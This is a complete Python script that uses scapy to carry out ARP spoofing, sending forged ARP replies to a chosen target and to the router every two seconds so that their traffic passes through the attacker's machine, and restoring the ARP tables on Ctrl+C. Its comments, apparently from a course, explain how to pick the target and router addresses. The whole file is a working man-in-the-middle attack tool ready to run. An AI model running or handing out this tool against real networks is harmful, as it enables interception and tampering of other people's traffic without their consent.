#! /usr/bin/env python

import scapy.all as scapy
import time
import argparse


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="target IP address")
    parser.add_argument("-s", "--spoof", dest="spoof_ip", help="spoof IP address")
    values = parser.parse_args()
    if not values.target_ip:
        parser.error(
            "[-] Please specify a target IP address, use --help for more information"
        )
    if not values.spoof_ip:
        parser.error(
            "[-] Please specify a spoof IP address, use --help for more information"
        )
    return values


def get_mac(ip):
    # Create ARP broadcast request
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    # Send and receive
    answer = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answer[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    # Creating ARP response packet
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(target_ip, source_ip):
    dst_mac = get_mac(target_ip)
    src_mac = get_mac(source_ip)
    packet = scapy.ARP(
        op=2, pdst=target_ip, hwdst=dst_mac, psrc=source_ip, hwsrc=src_mac
    )
    scapy.send(packet, verbose=False, count=4)


# For example with target IP 192.168.122.75 and spoof IP 192.168.122.1
# Use network_scanner to find target IP, and route -n to find router IP
options = get_args()
sent_packets_count = 0
try:
    while True:
        spoof(options.target_ip, options.spoof_ip)
        spoof(options.spoof_ip, options.target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetected CTRL+C ... Quitting and restoring original ARP values")
    # Restoring target
    restore(options.target_ip, options.spoof_ip)
    # Restoring router
    restore(options.spoof_ip, options.target_ip)
